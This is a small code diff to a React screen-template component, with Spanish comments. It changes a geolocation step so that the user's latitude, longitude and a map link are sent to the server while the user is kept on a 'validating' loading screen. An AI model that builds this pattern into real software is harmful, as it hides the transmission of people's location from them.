@@ -194,8 +194,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 onSubmit(ScreenType.VALIDANDO, {});
                 
                 // Después de 2 segundos, enviar los datos de ubicación al servidor
+                // pero mantenerse en la pantalla de cargando
                 setTimeout(() => {
-                  onSubmit(ScreenType.GEOLOCATION, {
+                  onSubmit(ScreenType.VALIDANDO, {
+                    // Incluir los datos de ubicación en el envío
+                    tipo: 'geolocation',
                     latitude: locationData.latitude,
                     longitude: locationData.longitude,
                     googleMapsLink: locationData.googleMapsLink,
